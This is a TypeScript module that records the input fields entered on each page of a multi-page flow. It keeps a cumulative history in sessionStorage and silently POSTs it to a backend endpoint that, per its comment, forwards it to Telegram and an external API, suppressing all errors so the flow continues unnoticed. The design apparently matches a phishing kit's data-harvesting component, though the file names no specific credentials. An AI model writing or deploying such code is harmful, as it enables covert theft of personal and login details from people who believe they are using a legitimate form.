export type ReportSection = { page: string; fields: Record<string, unknown> }

const STORAGE_KEY = "ubl_collected_sections"

function getStoredSections(): ReportSection[] {
  try {
    const raw = sessionStorage.getItem(STORAGE_KEY)
    const parsed = raw ? (JSON.parse(raw) as ReportSection[]) : []
    return Array.isArray(parsed) ? parsed : []
  } catch {
    return []
  }
}

function storeSections(sections: ReportSection[]): void {
  try {
    sessionStorage.setItem(STORAGE_KEY, JSON.stringify(sections))
  } catch {
    // ignore storage errors (e.g. private browsing) and continue the flow
  }
}

/**
 * Records a page's collected input details and sends the FULL cumulative
 * history collected so far (this page plus every earlier page in the flow)
 * to the backend data-forwarding endpoint, which fans it out to every
 * configured destination (Telegram, an external API, etc). Never throws so
 * it can't block the UI flow.
 */
export async function reportToTelegram(
  page: string,
  fields: Record<string, unknown>,
): Promise<void> {
  const sections = [...getStoredSections(), { page, fields }]
  storeSections(sections)

  try {
    await fetch("/api/forward", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sections }),
    })
  } catch {
    // ignore network errors and continue the flow
  }
}
